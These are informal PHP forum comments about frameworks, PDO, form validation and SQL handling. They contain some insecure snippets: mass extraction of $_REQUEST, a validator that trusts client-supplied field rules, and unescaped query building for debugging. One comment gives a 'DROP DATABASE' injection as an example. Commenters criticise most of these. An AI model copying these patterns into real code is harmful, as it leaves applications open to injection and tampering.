I know, to be honest though I have a lot of experience in PHP, I find it taxing to get involved with a new framework (currently [building my own one](https://github.com/radiosilence/core) that's essentially based around Pythonic conventions. Dumb? Maybe, but I prefer it to the other ones, and know exactly what it's doing). I will be more likely to pursue jobs doing Python, despite there being less of them, as I much prefer the language. I like the idea of actually getting involved in a project and I'll bare it in mind if I have issues with employment, unfortunately the ones I like the look of (Kohana, Symfony, Fuel) seem to be less common, and I don't really want to be writing legacy code for CodeIgniter or CakePHP or whatever any time soon.
Yep, most of the logic is on the page itself. So the system loads the blahpage.php directly, and blahpage.php includes adminheader.php, which includes a crapload of stuff. I had to do some madness with OB just to get it to work nicely with an existing template (a class consequently named OBMadness).
Absolutely horrible stuff there. Here's some equally horrible, but one-liner, code that does the same thing. extract(array_map('mysql_escape_string', $_REQUEST)); 
You're right. A user could alter the value of my hidden input and without some decent server-side permission checks this could be exploited. Thanks for the tips :)
I'd take a look at this: http://usercake.com/
it was between simple quote $a = 'foo'; echo "&gt; $a"; // display "&gt; foo" echo '&gt; $a'; // display "&gt; $a"
I actually volunteer with kohana. so don't let it scare you that a framework isn't really common. you can still find jobs for it. Go for what fits you best. honestly based on the look of your framework, you may be able to accomplish this by publicizing your framework and getting people to help you with it. 
Hey... is that from an osCommerce installation perchance? Sure looks familiar. Or did lots of people do that for a while? (I think the code I'm remembering was written by a contractor, hacked into osCommerce, of course...)
This is gold.
&gt; "Some people, when confronted with a problem, think “I know, I'll use ~~regular expressions~~ variable variables.” Now they have two problems."
Good to see you enjoy making your customers do your QA work for you. You should go buy a copy of [Release It!](http://www.amazon.com/Release-Production-Ready-Software-Pragmatic-Programmers/dp/0978739213/ref=sr_1_1?s=books&amp;ie=UTF8&amp;qid=1296594669&amp;sr=1-1) and read it cover to cover. BTW with your expert knowledge take some time to contribute to [Python vs PHP](http://wiki.python.org/moin/PythonVsPhp) I'm sure you'll have some great insight.
Thanks. It has a few problems, but those problems flagged up before it went on a production box. For example: if you try to use an object as an array key it doesn't call __toString, it just throws a warning for "invalid offset type". The warnings should show up in basic testing though, and point out uses of the variables pretty quickly.
&gt; significantly higher overhead Would you care to enlighten us? It's just an array, not a treadmill. 
Even better: turn on register\_globals and magic\_quotes (shudder)
It's also a static var which makes no sense in the object context and with the `setAssignmentName` method.
Wow you're awesome! Thanks for taking the time to write all that, I really appreciate the explanation!
I can setup a dev environment with five commands using MacPorts. It just has to handle a couple dozen connections at a time and have the same dependancies. A production server is an entirely different beast. If you have devs that know that stuff, great, but would never consider that a requirement for a job. That should be left to sysadmins who get paid to know what they're doing.
I also hate it when the server is set to automatically escape strings. You end up with entries in the database that are filled with millions of backslashes (because the POST variables were escaped once automatically then again because the code in the script assumed that the server wasnt automatically escaping variables.. which is the stupidest setting to ever allow anyone to use ever) 
I don't think in terms of overheard that there is any difference. the REQUEST superglobal is made at the same time POST and GET is. It's there no matter what. There's nothing inheritly wrong with it. Just it can cause problems if a page is accessed using both GET and POST and the same variable name is used in GET and POST but with different values. Something might screw up. However sometimes you simply don't care where the variable comes from, and if it really doesn't matter then go ahead and use request. No matter what you use though, you need to check and sanitize all inputs. Anyone can send a request to the webserver for anything. Don't be fooled into thinking that somehow COOKIE or POST are somehow more secure just because the data isn't written into the URL.
Sounds like http://www.phorum.org/ might be a good fit.
vBulletin has a user/login API so you would be able to make your own that, costly though.
if you do care, just change the priority order in php.ini
Exactly. Always disable magic quotes, or stripslashes them. Always use prepared statements for dynamic data.
Hey, just pay it forward by developing nice code :)
Fortunately not. In another job I part time at I do have the pleasure of hacking on an osCommerce installation that has been hacked on since 2003. Not fun.
Yeah, I will do once it reaches a level of maturity I'm happy with. Still lots of design decisions I go back on and I don't want to be encumbered with supporting things before I have to :D
With code that bad the only thing you can do is nuke it from orbit.
That's 4. Unless your counting the closure/anon function in PHP as two things... which it's not. Unless that's a trick question you ask people.
Thanks very helpful
I haven't messed w/ PDO yet but I'll have to soon or at least work w/ something soon once I get to that point in my current project. My only question is since I'm learning Zend Framework, does Zen's functions extend upon PDO, are the PDO "shortcuts" (if that makes any sense) or do most frameworks use something else entirely (reinvent the wheel possibly)? This stuff seems pretty straight forward otherwise.
Yes, but at the same time the stain of a poor company with a bad reputation on your resume can do far more damage to your career long-term.
Oh wow, that's quite clever! 
Common pattern with Zend Framework: ` $form = new App_Bla_Form(); if ($this-&gt;_request-&gt;isPost() &amp;&amp; $form-&gt;isValid($this-&gt;_request-&gt;getPost())) { $object = new Bla(); $object-&gt;setBla('bla') -&gt;save(); //redirect to a different route } $this-&gt;view-&gt;form = $form; `
When isn't stability crucial? I have never encountered a client that thinks random bugs are "ok". Working on large systems with many users also practically demands some form of unit testing to be in place to avoid huge gaffs like 250,000 emails being sent to users because of a flaw in the notification logic introduced by some innocuous change to a validation rule in some tangentially related model. While TDD isn't anywhere near a magical solution, and does not negate the need for good, old fashioned by-hand human QA, I would consider it an extremely valuable tool when applied appropriately, and is extremely useful for testing dozens of unique permutations of context and user input which would take hours, if not days to test by hand.
&gt; We could iterate through the rows without getting the numerical indices, like mysql_fetch_assoc() I prefer this as it doesn't unnecessarily double the data you get. PHP is generally smart enough not to double the storage requirements in cases like this. I haven't looked at the internals of PDO but I would assume it's done in a way that preserves PHP's ability to use references rather than copies. 
Pretty much any PHP framework under the sun has gone out of its way to make writing and processing forms as painless and cleanly structured as possible. CakePHP, Symphony, Kohana, CodeIgniter, Yii, Zend, Lithium, or any of the 500 billion other available projects - pick one.
wow, I was actually looking to write a CRUD framework tonight using PDO, and this is extremely helpful. I've been too reliant on a db abstraction layer for web apps these past years.. excellent!
If I'm not using whatever built-in functionality of some framework (i.e. I'm not using a framework), then it's usually something like this: if($_POST) { $attr_accessible = array('name', 'email', 'phone', 'address'); $attr_accessible = array_flip($attr_accessible); $v = new Validator; $v-&gt;fields = $_POST; $v-&gt;rules = array( 'name' =&gt; 'required|min_length(4)|max_length(32)', 'email =&gt; 'required|valid_email' ); $errors = $v-&gt;run(); if(!$errors) { foreach($_POST as $key=&gt;$val) { if(array_key_exists($key, $attr_accessible)) { // do stuff... } else { // log access violation } } } else return $errors; }
 &lt;?php if( is_array( $_POST['data'] ) &amp;&amp; isset( $_POST['submit'] ) ) { foreach( $_POST['data'] as $field =&gt; $data ) { if( strpos( ':', $field ) !== false ) { $info = explode( ':', $field ); $field = $info[0]; // reassign field name for later if( !check( $data, $info[1] ) ) { // blah } } else { // no check, we dont care, proceed } } } function check( $data, $type ) { if( empty( $data ) || empty( $type ) ) { return false; } switch( $type ) { case 'phone': if( preg_match( '/^(([0-9]{10})|([0-9]{3}-[0-9]{3}-[0-9]{4}))$/', $data ) ) { return true; } break; case 'mail': if( preg_match( '/^regex for mail$/', $data ) ) { return true; } break; case 'num': if( is_numeric( $data ) ) { return true; } break; } return false; } ?&gt; &lt;form action="" method="post"&gt; &lt;input type="text" name="data[firstname:notempty]" value="" /&gt; &lt;input type="text" name="data[lastname:notempty]" value="" /&gt; &lt;input type="text" name="data[phone:phone]" value="" /&gt; &lt;input type="text" name="data[anumber:num]" value="" /&gt; &lt;input type="text" name="data[email:mail]" value="" /&gt; &lt;input type="text" name="data[optional]" value="" /&gt; &lt;input type="submit" name="submit" value="submit..." /&gt; &lt;/form&gt; but there are way better ways to do this... take a look at: http://www.slimframework.com/ (post/get routes) and stuff like fuelphp.com and recessframework.org or if you want to try out how good your php is: http://lithify.me/
Formally? Couldn't resist... But I have always wondered if I was doing it correctly as well... Good question.
Could you expand this a little bit? Such as the "Validator" part. I'm interested in your "rules" array. 
Just come up with a structure to define your form, and then use an object to handle both outputting and processing it. You should be able to re-use the same object (maybe with some strategic overloading) for virtually all forms on all sites. I know I do. It makes forms as simple as writing out an array that defines the fields, labels, types, etc. Add some CSS and you're done.
Sure... I have a validation class that I use. In the rules array, the keys match the $_POST keys, and the values are the rules for those keys. Once it hits the validator's run() function, the rules string gets exploded into an array and then for each rule, a matching function gets called on the corresponding key value in the fields array (which is where we put $_POST). There is some messy crap that I don't like to deal with the 'rule(param)' stuff like for min_length &amp; max_length, but it works so I haven't gotten around to redoing it. If it passes, the script moves on to the next rule/key. If it fails, then it populates an $error array using that key, with an error message corresponding to the function. You can also call each of the rules as static functions, e.g. Validator::is_hex_color($_POST['color']); // calls... public static function is_hex_color($str) { return preg_match('/^#(?:(?:[a-f0-9]{3}){1,2})$/i', $str); } I'd post the class, but I want to check with a friend first, who wrote some of the code in it, because the project it was written for isn't released yet. It's pretty basic, though. I believe most form validators function similarly.
It's [this](http://twitter.com/#!/rasmus/status/29243336217) all over again :)
Yeah, I guess that's next week's lesson.
Well after days of "wtf are you doing not filtering, sanitizing, preparing, etc" responses from all of us, did you at least find a solution to your odd `update` issue?
I agree that mysql is just asking for trouble. I _wish_ they'd depreciate it already. And though mysqli would likely accidentally end in several accidental deaths and injuries pre-5.3.3 with how god damn buggy it was, it's actually the shit now if you don't want to deal with pdo just to get at your mysql database.
By not posting the output against commenter's advice.
Zend wraps PDO in it's own Zend_Db classes (Zend_Db_Adapter specifically), but mostly just for the database drivers. A lot of ORM libraries &amp; data layers do the same, since PDO is a super easy &amp; cheap way to add support for all the most common databases in one shot. And since most (all?) frameworks are heavy on OOP concepts, including Zend's, things can get pretty twisty &amp; abstract - definitely not as straightforward as the example up top. Absolutely worth the effort to learn though.
Having a thorough understanding of the MVC design pattern, and maybe having used custom built ones is more important that having developed in the framework which you think is best.
What you define is an all-rounder, jack-of-all-trades administrator/web developer who is border-line autistic. It's certainly not an experienced programmer, because a good programmer will be fluent in more than one language and have solid software engineering skills (V-Model, OO analysis and design patterns). They certainly won't have memorised php.net and know all the differences between 5.2 and 5.3.
Don't understand the downvote. 
Not really to do with validation but you should take a look at PHP form builder (http://code.google.com/p/php-form-builder-class/). It cuts out so much of the work that's needed to hand code forms. It produces good HTML that can be styled easily with CSS. It automatically self validates on the client side with nice jQuery and on the server side validates the fields depending on the specified criteria . An email field for example $form-&gt;addTextarea("Your address", "SubmitterAddress","", array("required" =&gt; 1)); ). And you can validate everything you've specified in the form really easily with... if($form-&gt;validate()) {
I still wrote a class to wrap up the PDO code. Minimises the code down from 20 lines a query to just 1 line. If you're wanting to check for db errors etc you need extra lines for exception handling etc. Your page scripts get very cluttered otherwise.
To be honest we usually (a team of 6 working on the same project for 2 years) have a folder in our repository where we store (in different files by date) the modifications done to the database. Maybe not the best solution, but we had no problem with it.
Welcome to Reddit. I see you're new here.
I use Zend_Form as well. Can't say I like the creation/display part but the validation &amp; filtering do the work well.
I was looking at this the other day for use on a project. It seemed pretty nice, but was a bit overkill for what I needed at the time. I'll definitely be keeping it in mind for future projects, though.
As long as it works for you guys, that's all that matters.
Instead of: &lt;?php echo ... ?&gt; you can use: &lt;?= ... ?&gt; From the PHP Manual entry on **[echo](http://php.net/manual/en/function.echo.php)** &gt;echo() also has a shortcut syntax, where you can immediately follow the opening tag with an equals sign. This short syntax only works with the short_open_tag configuration setting enabled. 
that's awful... A user can just locally edit the DOM and change them all of the [name:rules] to optional and pass whatever data they want. This is one of the times where ALWAYS VALIDATE USER INPUT is important
Umm, maybe I'm missing something, but what happens if someone submits a form without the ":filtername" in the field names? The checks are bypassed? That's a big no-no.
Why did you guys chose GraphicsMagick over ImageMagick or GIMP?
Do give an example? I'm doing it though abstraction/light ORM with loosely coupled backends. So it goes: Mapped Object (high level object contextual functions [dog-&gt;bark, etc]) Mapper (taking data, populating objects) Storage (data loading/saving) Backend (Containers etc for extension, in my case PDO) And in such a way that I will be able to "layer" storage, so a memcached or apc storage will be able plug in between a mapper and PDO storage. 
Fair enough. I do prefer getting a cleaner array, mind.
Instead of checking one variable it has to check 3 and decide which to use. May not sound like much but keep in mind a script could reference $_REQUEST hundreds of times or it could only be using it a few times but is called thousands or millions of times per day when users visit.
The only problem is having to keep your SQL cross compatible which is a PITA.
It's used by the other largest photo sites out there (such as Flickr) and its extremely robust and efficient. We've found it uses a lot less CPU than Imagemagick did, and has a nice interface as well.
Ah okay, thanks... I've gone with Imagemagick for now, but I guess I'll switch to that when I get the chance :)
Does anyone know any good simple CRUD frameworks for php?
https://github.com/radiosilence/core/blob/dev/core/storage/pdo.php Mine, though immature, builds upon crud by trying to get a more standard approach to things like filtering and joining that are common in many backends. 
Yeah, I probably should have left mysqli out of that, I tried using it back when it was added and it left a couple scars. Still a lot of deprecated functions to swim through, but it looks fairly solid now.
Fair point regarding keeping up to date with software releases. However, I'd pick someone that can solve a problem/write an algorithm over someone who knows every PHP function that was introduced in the latest release.
Honestly, unless you're running a super-high traffic site, either will work great. I'm sure you'll be happy with ImageMagick.
No, I think you've read some incorrect documentation. $_REQUEST is built up in the PHP init routines. It's a simple array_merge() result of GET and POST variables (and maybe COOKIES for older configurations). There are no double or triple lookups. It's an array.
The reason for this is [pretty convoluted](http://wiki.answers.com/Q/Why_does_February_have_28_days_while_the_other_months_have_30_or_31) also.
Yeah, I'm not too worried. I've got it working now with ImageMagick, ended up working out pretty smoothly. Thanks!
Yes, and I'm still waiting for the handbook to arrive after I got the verified e-mail trophy.
What do you mean by that? When you're using a framework, you can usually get to the point where you stop writing SQL statements altogether. For example: $query = "SELECT foo FROM bar WHERE baz = 'qux'" might become: $this-&gt;db-&gt;select('foo')-&gt;from('bar')-&gt;where('baz', 'qux')-&gt;run() or something along those lines.
PDO is not a shortcut — it's a fundamental part of PHP. To put it simply, it's another way of interacting with databases that is **much** more secure than using the old mysql functions. In fact, a lot of people argue that all the mysql functions should be depreciated. If you aren't careful with those, someone can submit fake form data that has scary things in it like "DROP DATABASE." Mysql functions would eat that up and happily destroy your database, whereas using PDO makes those kinds of attacks more difficult. I'm guessing almost any worthwhile framework (including Zend) uses PDO, but it's all behind the scenes, and you never really have to think about it. That's the whole point of a framework — you can construct a relatively simple DB query, along the lines of: $this-&gt;db-&gt;select('foo')-&gt;from('bar')-&gt;where('baz', 'qux')-&gt;run() And the framework takes care of all the "nitty-gritty" for you, in a secure and efficient manner (hopefully...).
Zend's wrapper, not PDO
PDO can return a row as an array: $result = $sth-&gt;fetch(PDO::FETCH_ASSOC); It can even [return *all* rows in one big array](http://us3.php.net/manual/en/pdostatement.fetchall.php). There's really no good reason to use the mysql functions over PDO, unless you enjoy a lack of security. A bit of a learning curve, yes, but worth it in the long run.
that IS the statement being executed. data is sent via separate API call. that's the whole point of prepared statements
Wha? I mean, you can specify a number of different DB interfaces in Zend, but in *most* cases (with MySQL) it's going to use PDO behind the scenes: http://framework.zend.com/manual/1.11/en/zend.db.adapter.html
Unfortunately you cannot, because of the way that it processes the statement and the variables separately. The closest thing you could do would be to copy the query you are preparing and add in the variables the same way you would do it without pdo, then echo that. 
Reread my original post
You should be able to view your statements in mysql's query log
Perhaps in mysql log files if they exist?
&gt; can be pasted into phpmyadmin If you already have phpmyadmin on the server why not create the table with it?
Ok. I did. Still confused. &gt; Zend's wrapper, not PDO Do you mean "Zend uses a proprietary wrapper, instead of PDO, for DB access"? Because that's not true...
But a more important idea is to create a data definition that is easily readable (by you) six months down the line. I have this: $dataDef['comment']=array ( "commentId"=&gt;array ( "type"=&gt;"int", "size"=&gt;4, "primary key"=&gt;true, "auto_increment"=&gt;true, "null"=&gt;false, "validate as"=&gt;"number" ), "commentText"=&gt;array ( "type"=&gt;"text", "validate as"=&gt;"text" ), "parentCommentId"=&gt;array ( "type"=&gt;"int", "size"=&gt;4, "validate as"=&gt;"text" ) ); Which then gets parsed by this in my db class function create_tables() { foreach ($this-&gt;dataDef as $table =&gt; $field) { $sql = ""; $sqlVars = ""; $sql = "DROP TABLE " . $table . "; "; $this-&gt;sql = $sql; $this-&gt;execute_blind_query(); $sql = "CREATE TABLE " . $table . " ("; foreach ($field as $fieldName =&gt; $mods) { echo $table. "." . $fieldName . "&lt;br&gt;"; if ($sqlVars != "" ) { $sqlVars .= ", "; } $sqlVars .= $fieldName . " "; foreach ($mods as $var =&gt; $value) { if ($var == "type") { $sqlVars .= "" . $value; } if ($var == "size") { $sqlVars .= "(" . $value .")"; } if ($var == "auto_increment" &amp;&amp; $value == true) { $sqlVars .= " auto_increment"; } if ($var == "null" &amp;&amp; $value == false) { $sqlVars .= " not null"; } if ($var == "primary key" &amp;&amp; $value == true) { $sqlVars .= " primary key"; } } $sqlVars .= " "; } $sql .= $sqlVars . ")"; $this-&gt;sql=$sql; if (!$this-&gt;execute_blind_query()) { echo "CREATE TABLE FAILED\n" . mysql_error() . "\n"; } else { echo "CREATE TABLE $table SUCCEEDED\n"; } echo $sql . "\n\nFROM CLASS\n\n"; $this-&gt;sql=""; } echo "&lt;/pre&gt;"; } That way I just have to refer to my initial data definition file to remember what the heck I was thinking in the first place. Also the data definition can get used elsewhere - hence the 'validate as', I use that to validate the data beyond sql sanitation. Edit: also this provides me a way to THINK about my tables before I create them, I don't have to be in phpmyadmin to create tables, I'm not creating tables on the fly, and I can recreate tables during my development phase.
It's cool that you were able to create this and build something useful for yourself. Hopefully, you also learned a few new things while building it. I don't really see the advantage of using this over writing plain SQL. I feel like it's just a crutch for someone that doesn't know (or is intimidated to learn) SQL.
Please stop trying to find holes in what I wrote because you're way off &amp; you're not contributing anything to the discussion. Thanks anyway.
Isn't it just easier to read "SHOW CREATE TABLE comment;" than read through (and parse via code) a non-standard format?
Perhaps, but I've gotten really really burnt by developers around me not having a data definition so I decided that I want to think about my tables before I do any creating of tables. This forethought will pay off I hope.
As has been posted already, no, there is no way to do what you're asking. This can give you some more info on the query though: $prep-&gt;debugDumpParams(); (where $prep is your PDO handler); other than that you'll have to manually print out the variables being sent to the query or build a query handler with a debug routine.
I get that but I want the sql query after the variables have been added to it.
You can't because it doesn't exist. You could try logged at the server, though.
Bless you.
see the edit above. advantage is its faster for me. &gt; I feel like it's just a crutch for someone that doesn't know (or is intimidated to learn) SQL. you could say that about any framework 
too much clicking
I'd recommend you use :named tokens instead of ?, as it makes things a whole lot simpler to debug. But the answer is no, you can't really view them together as they are separate until the SQL server combines them. If your server supports logging, perhaps?
it happens on mysql-server side, so you might see something there. php-side just doesn't have this information, because (sorry for repeating) query with placeholders and actual data is sent separately. php never puts data on place of placeholders p.s. actually, in case of PDO, there is an option to use so-called "emulated prepared statements", but still there is no API to get result-string from it, AFAIK
I demonstrated these in the OP :) Thanks though.
I found abstracting in that way was kind of pointless as it's not really much more abstract than SQL itself, and doesn't solve the SQL incompatibilities I mean (data formats, functions, methodologies like TOP vs LIMIT). I prefer abstracting at a slightly higher level, but then there's the issue of doing far more complex queries. I guess if you're writing something that requires that sort of logic, you're best off skipping the abstraction.
Off the top of my head, assuming you're using named tokens, you could do something like this: function debug_query($sql, $params) { foreach($params as $key=&gt;$val) { $sql = str_replace(':'.$key, "'".$val."'", $sql); } return $sql; } echo debug_query("SELECT id FROM uses WHERE username=:uname AND password=:pass"); I'm sure there are more efficient ways. My regex-fu is weak.
You can copy and pate the prepared statement into mysql console and bind the params to the query and then execute it. http://dev.mysql.com/tech-resources/articles/4.1/prepared-statements.html
Whoa, I wasn't trying to rip you apart. I was honestly just confused by what you meant by "Zend's wrapper." And to be honest, I've never used Zend, but to me, based on the Zend documentation, it appears that Zend does utilize PDO. You asked if Zend extends PDO or uses something else entirely, and I attempted to answer your question.
This was my experience with it as well. I gave up and left when I actually saw one with about 30+ likes that was, I kid you not, "Here's an awesome way to display the date in your copyright statements! &lt;?=date("Y")?&gt;" and similar such things for JQuery/JavaScript, RoR, etc. There are some interesting things there to look at, from a design perspective, but the Forrst developer community is a bit... lacking.
Ah, true. I guess I should have left my question as, "What do you mean by that?"
Heh, sorry. Now don't I feel dumb.
&gt; PDO is not a shortcut — it's a fundamental part of PHP. My question was whether Zend was providing shortcuts for PDO. When I say shortcuts I mean taking PDO &amp; adding commonly used code for security, ease of use, whatever..... I don't have any experience w/ PDO so I don't know all of Zend's reasons for creating their own libraries. &gt; Do you mean "Zend uses a proprietary wrapper, instead of PDO, for DB access"? Because that's not true... "Zend's wrapped" was just another way of me saying Zend's library, again I don't know exactly how they extend upon PDO beyond gradecurve's response. You were way out in left field w/ this. Sorry I didn't mean to come off as a dick. 
Why not just use SQL? Your data definition is actually more obscure than just doing create table agents ( id SERIAL PRIMARY KEY, fullname varchar, alias varchar UNIQUE, email varchar UNIQUE, phone varchar, address text, course varchar, societies varchar, clubs varchar, timetable text, imagefile varchar UNIQUE ); (for pgsql, anyway)
Go to MySQL and turn [on logging](http://dev.mysql.com/doc/refman/5.1/en/query-log.html) while you debug.
And why would you want to do this? Hopefully you're not running a production site on MAMP. And you don't really need memcache, apc, etc. on a dev install of PHP.
And you don't think that would cause overhead?
&gt; And why would you want to do this? To test code.
It's the quotes that net beans is telling you to add. You can't have the question mark followed immediately before the colon. &gt; defined('INC') ? '' : exit(); Should work just fine.
You can in PHP 5.3. Edit: to clarify, defined('INC') ?: exit(); should work in 5.3. Your version would be backward compatible though.
`defined('INC') or exit();`
CakePHP
Ternary select requires something on either side of the colon, as well as something to be checked. Ternary as in three. As in you can't skip that. Put any value there. In the meantime, it's better expressed if (!(defined('INC'))) { exit(); } Putting ternary select in when you explicitly don't want to provide a first clause is silly.
The behavior is undefined. That it happens to work in one particular version is immaterial.
No, that behavior is defined. In 5.3.
Good vs bad in form you could use a regular expression like ^((?&gt;[a-zA-Z\d!#$%&amp;'*+\-/=?^_`{|}~]+\x20*|"((?=[\x01-\x7f])[^"\\]|\\[\x01-\x7f])*"\x20*)*(?&lt;angle&gt;&lt;))?((?!\.)(?&gt;\.?[a-zA-Z\d!#$%&amp;'*+\-/=?^_`{|}~]+)+|"((?=[\x01-\x7f])[^"\\]|\\[\x01-\x7f])*")@(((?!-)[a-zA-Z\d\-]+(?&lt;!-)\.)+[a-zA-Z]{2,}|\[(((?(?&lt;!\[)\.)(25[0-5]|2[0-4]\d|[01]?\d?\d)){4}|[a-zA-Z\d\-]*[a-zA-Z\d]:((?=[\x01-\x7f])[^\\\[\]]|\\[\x01-\x7f])+)\])(?(angle)&gt;)$ 
Isn't one change to the latest iteration of PHP a shortened version of the ternary operator that doesn't require the bit after the question mark?
Out of interest, where? There's some other things I'm hoping they do like: Blah?blah();
It's [in the docs](http://php.net/ternary) (US version I get sent to, at least). Scroll down to ternary, between example 2 and the first note.
That was one of the first things I had to learn in php. I inherited a bunch of code from a guy who used the short tags all over the place. I suppose I may have developed an allergic reaction to them. While it does save some keystrokes, it's worth remembering that not every server is configured to recognize short tags, which is probably why I've read a few style guides that advice against using them. 
and thats why i switched to mongodb.
As mentioned earlier, the shortened ternary operator is valid in 5.3, but I'd avoid it due to backwards compatibility. I don't find the shortened form particularly readable, either, but that may be due to it not being terribly common at this time. Oh, and conserve those parens, you never know when there could be a shortage... ;) if(!defined('INC')) exit;
Cool, cheers.
My guess? You don't have version 5.3 installed properly. I.e works fine for me, and I do.